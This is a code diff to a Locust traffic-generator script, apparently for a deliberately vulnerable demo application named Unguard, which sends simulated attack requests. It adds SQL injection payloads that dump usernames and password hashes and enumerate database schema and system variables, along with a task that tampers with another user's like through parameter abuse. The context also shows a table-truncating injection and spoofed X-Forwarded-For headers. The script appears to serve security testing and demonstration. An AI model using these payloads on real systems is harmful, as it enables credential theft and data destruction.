@@ -17,7 +17,8 @@
 import os
 import random
 import time
-from locust import HttpUser, task, between
+
+from locust import HttpUser, between, task
 
 LOCATION_BASED_IPS = ['177.236.37.155',
                       '49.210.236.225',
@@ -106,6 +107,12 @@ SQL_CMDS_MEMBERSHIP = [
     'HACKEDPRO") ON DUPLICATE KEY UPDATE membership="HACKEDPRO"; TRUNCATE TABLE membership; -- ',
 ]
 
+SQL_CMDS_USERNAME = [
+    "' UNION SELECT id+1000, username, password_hash FROM users;--",
+    "' and 1 = 0 UNION SELECT VARIABLE_NAME, VARIABLE_NAME, GLOBAL_VALUE FROM INFORMATION_SCHEMA.SYSTEM_VARIABLES;--",
+    "' and 1 = 0 UNION SELECT TABLE_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES;--"
+]
+
 WAIT_TIME = int(os.environ['WAIT_TIME'])
 
 class UnguardUser(HttpUser):
@@ -153,6 +160,23 @@ class UnguardUser(HttpUser):
 
         # post the malicious SQL command
         self.client.post("/membership/" + self.get_running_username(), data=sql_membership, headers=self.get_random_x_forwarded_for_header())
+        time.sleep(1)
+
+    @task()
+    def get_sql_golang(self):
+        sql_username = {'name': random.choice(SQL_CMDS_USERNAME)}
+
+        # get with the malicious SQL command
+        self.client.get("/users", params=sql_username, headers=self.get_random_x_forwarded_for_header())
+        time.sleep(1)
+
+    @task()
+    def post_sql_php(self):
+        post_id = 1
+        user_id = 1
+
+        # try to remove the like of the admanger account (user ID 1) on the first post (post ID 1).
+        self.client.get("/unlike", params={'postId': [post_id, user_id]}, headers=self.get_random_x_forwarded_for_header())
         time.sleep(1)
 
     def on_start(self):
